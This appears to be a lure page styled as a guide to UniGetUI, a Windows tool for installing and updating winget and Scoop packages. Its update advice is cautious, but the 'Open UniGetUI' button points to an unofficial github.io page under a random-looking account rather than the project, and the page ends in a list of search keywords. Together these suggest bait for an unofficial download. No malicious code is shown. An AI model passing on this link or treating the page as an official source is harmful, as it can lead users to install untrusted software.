# UniGetUI - Install and Update Windows Packages from One List

## What the Window Is Doing

Winget and Scoop already know how to install software. UniGetUI, the project that used to be called WingetUI, puts their catalogs in a grid with versions, sources, and available updates. You can see that a tool is two versions behind without opening each vendor site. The install still comes from the source you selected, under that source's installer.

The first run should be a look, not a click on every update. Security tools, drivers, and anything your company manages are easy to break with a surprise upgrade. User programs you installed yourself are the ordinary selection.

## Sources

| Source | What you get |
|---|---|
| Winget | The Windows package catalog |
| Scoop | Portable-style buckets, if you use Scoop |
| Other connectors the build lists | Only if you turned them on |
| A package with no name you know | Not an update to apply |
| Drivers and firmware | Usually the wrong job for a bulk tick |

## A Careful Update

1. Open the update list and read every name.  
2. Untick security suites, VPN clients, and anything you just configured.  
3. Update one or two familiar programs first.  
4. Confirm they still start.  
5. Only then run a larger batch of ordinary apps.  
6. Ignore packages that are not installed if you only came for updates.  

[![Open UniGetUI](https://img.shields.io/badge/Open-UniGetUI-1f6feb?style=for-the-badge&logo=windows&logoColor=white)](https://liamhafqku365.github.io/.github/package-update-list)

## New Installs

Search is for a program you already decided to add. Check the source and the publisher on the row before you install. Two packages can share a short name. The ID column is the one that distinguishes them. Pin a version if you know the newest build breaks a workflow. UniGetUI can show newer releases without forcing them the same day.

Do not point it at a random extra bucket you saw in a comment. Extra sources are how an unfamiliar package lands in the same list as the ones you trust.

## Who It Fits

People who already install desktop software with winget or Scoop and want a review screen. A poor fit for Store-only apps you update in the Store. A poor fit for GPU drivers and phone firmware. A poor fit for a PC whose updates are controlled by policy. The tool will not override an administrator who blocks those installers.

## Requirements

| Item | Expectation |
|---|---|
| OS | Windows 10 or 11 the current build supports |
| Winget | Present, since that is the usual source |
| Rights | Administrator when the installer needs it |
| Network | Required to refresh catalogs |
| Review | A human on the tick list |

## Fixes

The catalog is empty. Winget is missing or the network blocked the source.  
An update fails. Read that package's installer. The others can still be fine.  
The wrong app installed. The short name matched another ID. Uninstall it and search the full ID.  
A program you need was upgraded overnight. You left a schedule on. Turn it off until the manual list is familiar.  
You wanted leftover files removed. This is an installer front, not a cleaner.

## After the Batch

Open the two programs you use most and confirm settings survived. UniGetUI does not know which config file an upgrade replaces. If one app reset itself, pin the previous version or skip it next time. Keep the bulk habit for small tools. Leave the ones that carry accounts and device drivers on their own update path.

![UniGetUI update list with unfamiliar packages left unticked](https://images-eds-ssl.xboxlive.com/image?url=4rt9.lXDC4H_93laV1_eHHFT949fUipzkiFOBH3fAiZZUCdYojwUyX2aTonS1aIwMrx6NUIsHfUHSLzjGJFxxnw8DVCREBQRVakddWo398Mv8pTxuO5C20UsW6gJNQu7r6XXxrfPfBtN93mr8eXlHkAD1cSmmNPIPe_3_WPMRBw-&format=source)

## After the List Settles

Leave the window open until every ticked row finishes.
A failed row stays visible. Read it before you run the list again.
Packages you did not recognize stay unticked.
Pin the ones you update every week so the next pass is shorter.
If a package asks for a reboot, finish the rest first, then reboot once.
Sources that are not winget stay listed only if you use them.
A package id you do not recognize stays unticked for a reason.
Run the short list again after the reboot and see what is still pending.
Scoop and winget can both offer the same program. Pick one row.

## Phrase List

unigetui, wingetui, unigetui windows, bulk install updates, winget graphical updates, scoop unigetui, review updates before install, unigetui package id
